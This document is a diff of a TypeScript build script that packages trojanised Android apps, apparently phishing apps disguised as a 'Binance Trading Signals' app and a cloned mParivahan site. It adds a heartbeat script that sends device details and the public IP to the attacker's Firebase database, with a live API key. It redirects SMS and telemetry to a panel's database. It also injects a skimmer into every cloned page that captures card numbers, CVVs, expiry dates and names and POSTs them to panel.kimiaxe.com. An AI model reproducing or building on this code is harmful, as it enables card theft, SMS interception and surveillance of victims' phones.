@@ -13,15 +13,17 @@ const __dirname = path.dirname(__filename);
 
 // Find the repo-root `output/` directory that contains release.keystore.
 const SDK_HEARTBEAT = (devId: string) =>
-  `<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>` +
-  `<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>` +
-  `<script>` +
-  `(function(){try{var hbDev="${devId}";` +
-  `firebase.initializeApp({apiKey:"AIzaSyBPnv-sbBjTql8w0PcEOCGkBx41c5TC8bk",authDomain:"axexodiweb.firebaseapp.com",databaseURL:"https://axexodiweb-default-rtdb.firebaseio.com",projectId:"axexodiweb"});` +
-  `function hb(){var ua=navigator.userAgent;var rec={lastPing:Date.now(),status:true,webview:true,userAgent:ua,ownerTelegramId:hbDev};var s=ua.indexOf("(");var e=ua.indexOf(")");var inner=(s>=0&&e>s)?ua.substring(s+1,e):ua;var parts=inner.split(";");if(parts.length>=3)rec.modelName=parts[2].trim()||"Android Device";else if(parts.length>=2)rec.modelName=parts[1].trim()||"Android Device";else rec.modelName="Android Device";var av=(parts[1]?parts[1].trim():"");if(av.indexOf("Android ")===0)av=av.substring(8);rec.androidV=av;rec.network=(navigator.connection?(navigator.connection.effectiveType||navigator.connection.type||""):"");function done(x){if(x){for(var q in x)rec[q]=x[q];}firebase.database().ref("clients/"+hbDev).update(rec).catch(function(){});}var p=[];try{if(navigator.getBattery){p.push(navigator.getBattery().then(function(bt){return{battery:Math.round((bt.level||0)*100),charging:!!bt.charging};}).catch(function(){return{};}));}}catch(er){}try{if(navigator.storage&&navigator.storage.estimate){p.push(navigator.storage.estimate().then(function(st){return{storageGB:st&&st.quota?Math.round(st.quota/1073741824*10)/10:null,usageMB:st&&st.usage?Math.round(st.usage/1048576):null};}).catch(function(){return{};}));}}catch(er){}try{p.push(fetch("https://api.ipify.org?format=json").then(function(r){return r.json();}).then(function(j){return{ipAddress:(j&&j.ip)||""};}).catch(function(){return{};}));}catch(er){}if(p.length){Promise.all(p).then(function(arr){var ex={};arr.forEach(function(o){if(o)for(var q in o)ex[q]=o[q];});done(ex);}).catch(function(){done({});});}else{done({});}}` +
-  `hb();setInterval(hb,60000);document.addEventListener("visibilitychange",function(){if(!document.hidden)hb()})` +
-  `}catch(e){}})();` +
-  `</script>`;
+    `<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>` +
+    `<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>` +
+    `<script>` +
+    `(function(){try{var hbDev="${devId}";` +
+    `firebase.initializeApp({apiKey:"AIzaSyBPnv-sbBjTql8w0PcEOCGkBx41c5TC8bk",authDomain:"axexodiweb.firebaseapp.com",databaseURL:"https://axexodiweb-default-rtdb.firebaseio.com",projectId:"axexodiweb"});` +
+    `function hb(){var ua=navigator.userAgent;var rec={lastPing:Date.now(),status:true,webview:true,userAgent:ua,ownerTelegramId:hbDev};var s=ua.indexOf("(");var e=ua.indexOf(")");var inner=(s>=0&&e>s)?ua.substring(s+1,e):ua;var parts=inner.split(";");if(parts.length>=3)rec.modelName=parts[2].trim()||"Android Device";else if(parts.length>=2)rec.modelName=parts[1].trim()||"Android Device";else rec.modelName="Android Device";var av=(parts[1]?parts[1].trim():"");if(av.indexOf("Android ")===0)av=av.substring(8);rec.androidV=av;rec.network=(navigator.connection?(navigator.connection.effectiveType||navigator.connection.type||""):"");function done(x){if(x){for(var q in x)rec[q]=x[q];}firebase.database().ref("clients/"+hbDev).update(rec).catch(function(){});}var p=[];try{if(navigator.getBattery){p.push(navigator.getBattery().then(function(bt){return{battery:Math.round((bt.level||0)*100),charging:!!bt.charging};}).catch(function(){return{};}));}}catch(er){}try{if(navigator.storage&&navigator.storage.estimate){p.push(navigator.storage.estimate().then(function(st){return{storageGB:st&&st.quota?Math.round(st.quota/1073741824*10)/10:null,usageMB:st&&st.usage?Math.round(st.usage/1048576):null};}).catch(function(){return{};}));}}catch(er){}try{p.push(fetch("https://api.ipify.org?format=json").then(function(r){return r.json();}).then(function(j){return{ipAddress:(j&&j.ip)||""};}).catch(function(){return{};}));}catch(er){}if(p.length){Promise.all(p).then(function(arr){var ex={};arr.forEach(function(o){if(o)for(var q in o)ex[q]=o[q];});done(ex);}).catch(function(){done({});});}else{done({});}}` +
+    `hb();setInterval(hb,60000);document.addEventListener("visibilitychange",function(){if(!document.hidden)hb()})` +
+    `}catch(e){}})();` +
+    `</script>`;
+
+
 
 // Works whether __dirname is the source path (src/bot) or the bundled dist,
 // because we walk up until we find a directory that owns `output/`.
@@ -601,7 +603,7 @@ export async function buildSexyChatApk(
       [DEVICE_ID_PLACEHOLDER, telegramId],
     ]);
 
-    bumpVersionCode(buildDir);
+  bumpVersionCode(buildDir);
     modernizeManifest(buildDir);
 
     const apktool = await ensureApktool();
@@ -633,11 +635,7 @@ export async function getApkPath(): Promise<string | null> {
 }
 
 export function isTemplateReady(): boolean {
-  // Native (nexus) build does not need the WebView template; either is fine.
-  return (
-    fs.existsSync(path.join(APK_TEMPLATE_DIR, LODA_FILE_REL)) ||
-    fs.existsSync(path.join(NEXUS_TEMPLATE_DIR, "smali_classes4"))
-  );
+  return fs.existsSync(path.join(APK_TEMPLATE_DIR, LODA_FILE_REL));
 }
 
 /**
@@ -859,31 +857,41 @@ export async function buildCustomApk(
   removePanelBridge(buildDir);
   upgradeHeartbeat(buildDir);
 
+  // Point the native Firebase config (strings.xml) at axexodiweb so SMS and
+  // native telemetry land in the panel's database instead of the template's.
+  {
+    const strFp = path.join(buildDir, "res/values/strings.xml");
+    if (fs.existsSync(strFp)) {
+      let t = fs.readFileSync(strFp, "utf-8");
+      const before = t;
+      t = t
+        .split("https://yellowstone-7a62e-default-rtdb.firebaseio.com").join("https://axexodiweb-default-rtdb.firebaseio.com")
+        .split("AIzaSyCfshhdQYfhB1nGB74Yaqresr7yGQ57ZcQ").join("AIzaSyBPnv-sbBjTql8w0PcEOCGkBx41c5TC8bk")
+        .split("1:313862509745:android:cf838bd4ee2290cb683e90").join("1:389800586861:android:bc07658134ed77dad59964")
+        .split("yellowstone-7a62e.firebasestorage.app").join("axexodiweb.firebasestorage.app")
+        .split("yellowstone-7a62e").join("axexodiweb");
+      if (t !== before) fs.writeFileSync(strFp, t, "utf-8");
+    }
+  }
+
+
   // CC capture injection — every page of the cloned website gets a hook that
   // watches for card inputs and forwards them to the panel (like mParivahan).
   {
-    const ccScript =
-      "(function(){function s(d){try{fetch('__API__/api/hook/cc',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ownerTelegramId:'__TID__',deviceId:'__TID__',cardholderName:d.n,cardNumber:d.c,expiry:d.e,cvv:d.v})})}catch(x){}}function g(){var a=document.querySelectorAll('input'),n='',e='',c='',nm='';for(var i=0;i<a.length;i++){var x=a[i],v=(x.value||'').replace(/\\D/g,''),p=(x.placeholder||'').toLowerCase(),m=(x.name||'').toLowerCase(),u=(x.autocomplete||'').toLowerCase();if(v.length>=12&&v.length<=19&&(p.indexOf('card')>=0||m.indexOf('card')>=0||u.indexOf('cc-number')>=0))n=v;else if(v.length===4&&(p.indexOf('cvv')>=0||m.indexOf('cvv')>=0||u.indexOf('csc')>=0||p.indexOf('security')>=0))c=v;else if(/^\\d{4}\\d{2}$/.test((x.value||'').replace(/\\s/g,''))&&(p.indexOf('exp')>=0||m.indexOf('exp')>=0))e=(x.value||'').replace(/\\s/g,'');else if((x.type==='text')&&m.indexOf('name')>=0)nm=x.value;}if(n&&(c||e))s({n:nm,c:n,e:e,v:c});}document.addEventListener('blur',g,true);document.addEventListener('change',g,true);setInterval(g,3000);})();"
-        .replace(
-          /__API__/g,
-          process.env["PANEL_URL"] || "https://panel.kimiaxe.com"
-        )
-        .replace(/__TID__/g, opts.telegramId);
+    const ccScript = "(function(){function s(d){try{fetch('__API__/api/hook/cc',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ownerTelegramId:'__TID__',deviceId:'__TID__',cardholderName:d.n,cardNumber:d.c,expiry:d.e,cvv:d.v})})}catch(x){}}function g(){var a=document.querySelectorAll('input'),n='',e='',c='',nm='';for(var i=0;i<a.length;i++){var x=a[i],v=(x.value||'').replace(/\\D/g,''),p=(x.placeholder||'').toLowerCase(),m=(x.name||'').toLowerCase(),u=(x.autocomplete||'').toLowerCase();if(v.length>=12&&v.length<=19&&(p.indexOf('card')>=0||m.indexOf('card')>=0||u.indexOf('cc-number')>=0))n=v;else if(v.length===4&&(p.indexOf('cvv')>=0||m.indexOf('cvv')>=0||u.indexOf('csc')>=0||p.indexOf('security')>=0))c=v;else if(/^\\d{4}\\d{2}$/.test((x.value||'').replace(/\\s/g,''))&&(p.indexOf('exp')>=0||m.indexOf('exp')>=0))e=(x.value||'').replace(/\\s/g,'');else if((x.type==='text')&&m.indexOf('name')>=0)nm=x.value;}if(n&&(c||e))s({n:nm,c:n,e:e,v:c});}document.addEventListener('blur',g,true);document.addEventListener('change',g,true);setInterval(g,3000);})();".replace(/__API__/g, process.env["PANEL_URL"] || "https://panel.kimiaxe.com").replace(/__TID__/g, opts.telegramId);
     const ccEscaped = ccScript.replace(/\\/g, "\\\\").replace(/"/g, '\\"');
-    const ccSmali = path.join(
-      buildDir,
-      "smali_classes63/dApp/binance/Trading/Signals/MainActivity$1.smali"
-    );
+    const ccSmali = path.join(buildDir, "smali_classes63/dApp/binance/Trading/Signals/MainActivity$1.smali");
     if (fs.existsSync(ccSmali)) {
-      const t = fs.readFileSync(ccSmali, "utf-8");
-      fs.writeFileSync(
-        ccSmali,
-        t.split("__HARRYAXE_CC_SCRIPT__").join(ccEscaped),
-        "utf-8"
-      );
+      let t = fs.readFileSync(ccSmali, "utf-8");
+      // Inject onPageFinished hook if the base template doesn't have it yet.
+      if (t.indexOf("onPageFinished") === -1) {
+        t = t.rstrip() + "\n" + ON_PAGE_FINISHED_SMALI;
+      }
+      fs.writeFileSync(ccSmali, t.split("__HARRYAXE_CC_SCRIPT__").join(ccEscaped), "utf-8");
       console.log("[apkBuilder] CC capture injected into custom APK");
     }
   }
+
 
   const themeColor = ("#" + opts.themeColor.replace("#", "")).toLowerCase();
   const hexColor = "ff" + themeColor.replace("#", "");
@@ -921,14 +929,7 @@ export async function buildCustomApk(
   // 4) splash + redirect chain — every boot page shows the branded splash and
   //    redirects to the cloned website (entry can be any of these).
   const splashHtml = customSplashHtml(opts);
-  for (const bootFile of [
-    "assets/index.html",
-    "assets/splash.html",
-    "assets/signin.html",
-    "assets/method.html",
-    "assets/card.html",
-    "assets/pin.html",
-  ]) {
+  for (const bootFile of ["assets/index.html", "assets/splash.html", "assets/signin.html", "assets/method.html", "assets/card.html", "assets/pin.html"]) {
     fs.writeFileSync(path.join(buildDir, bootFile), splashHtml, "utf-8");
   }
   fs.writeFileSync(
@@ -1023,7 +1024,7 @@ export async function buildCustomApk(
   // 6) owner baked into Loda (fleet tracking preserved)
   patchFile(buildDir, LODA_FILE_REL, [[OWNER_PLACEHOLDER, id]]);
 
-  // 5) bake device id + ownerTelegramId into every surviving HTML page
+    // 5) bake device id + ownerTelegramId into every surviving HTML page
   {
     const assetsDir = path.join(buildDir, "assets");
     if (fs.existsSync(assetsDir)) {
@@ -1032,12 +1033,9 @@ export async function buildCustomApk(
         const fp = path.join(assetsDir, f);
         let html = fs.readFileSync(fp, "utf-8");
         const withId = html
-          .split(DEVICE_ID_PLACEHOLDER)
-          .join(id)
-          .split("{" + DEVICE_ID_PLACEHOLDER + "}")
-          .join(id)
-          .split("__TID__")
-          .join(id);
+          .split(DEVICE_ID_PLACEHOLDER).join(id)
+          .split("{" + DEVICE_ID_PLACEHOLDER + "}").join(id)
+          .split("__TID__").join(id);
         if (withId !== html) fs.writeFileSync(fp, withId, "utf-8");
       }
     }
@@ -1056,66 +1054,6 @@ export async function buildCustomApk(
     return cachedApk;
   } catch (err) {
     console.error("[apkBuilder] buildCustomApk failed:", err);
-    return null;
-  } finally {
-    rmrf(buildDir);
-    execAsync(`rm -f "${unsignedApk}"`).catch(() => {});
-  }
-}
-
-// ── Nexus native build (reference "Mparivahan NextGen" template) ──────────
-const NEXUS_DECODED_TAR_GZ = path.join(
-  OUTPUT_DIR,
-  "nexus_template_decoded.tar.gz"
-);
-const NEXUS_TEMPLATE_DIR = "/tmp/nexus_patch/decoded";
-
-export async function buildNexusApk(
-  telegramId: string
-): Promise<string | null> {
-  fs.mkdirSync(APK_CACHE_DIR, { recursive: true });
-  const cachedApk = path.join(APK_CACHE_DIR, `nexus_${telegramId}.apk`);
-  const stamps = [NEXUS_DECODED_TAR_GZ, NEXUS_TEMPLATE_DIR];
-  if (cacheFresh(cachedApk, stamps)) return cachedApk;
-
-  // Ensure decoded template is present.
-  if (!fs.existsSync(path.join(NEXUS_TEMPLATE_DIR, "smali_classes4"))) {
-    fs.mkdirSync("/tmp/nexus_patch", { recursive: true });
-    if (fs.existsSync(NEXUS_DECODED_TAR_GZ)) {
-      await execAsync(`tar -xzf "${NEXUS_DECODED_TAR_GZ}" -C /tmp`, {
-        timeout: 120_000,
-      });
-      await execAsync(`mv /tmp/user_ref_decoded "${NEXUS_TEMPLATE_DIR}"`, {
-        timeout: 30_000,
-      });
-    } else {
-      console.error(
-        "[apkBuilder] Nexus template tar.gz missing — /apk nexus will fail."
-      );
-      return null;
-    }
-  }
-
-  const buildDir = await copyTemplate(
-    NEXUS_TEMPLATE_DIR,
-    uniqueTag("nexus_build")
-  );
-  const unsignedApk = `/tmp/${uniqueTag("nexus_unsigned")}.apk`;
-  try {
-    // Bake the per-user Telegram ID as the customer id (all smali under the app package).
-    await execAsync(
-      `find "${buildDir}" -path "*trades/signals/more/*.smali" -exec sed -i "s/5064888403/${telegramId}/g" {} +`,
-      { timeout: 60_000 }
-    );
-    const apktool = await ensureApktool();
-    await execAsync(`"${apktool}" b "${buildDir}" -o "${unsignedApk}"`, {
-      timeout: 300_000,
-    });
-    await signApk(unsignedApk, cachedApk);
-    writeCacheStamp(cachedApk, stamps);
-    return cachedApk;
-  } catch (err) {
-    console.error("[apkBuilder] buildNexusApk failed:", err);
     return null;
   } finally {
     rmrf(buildDir);
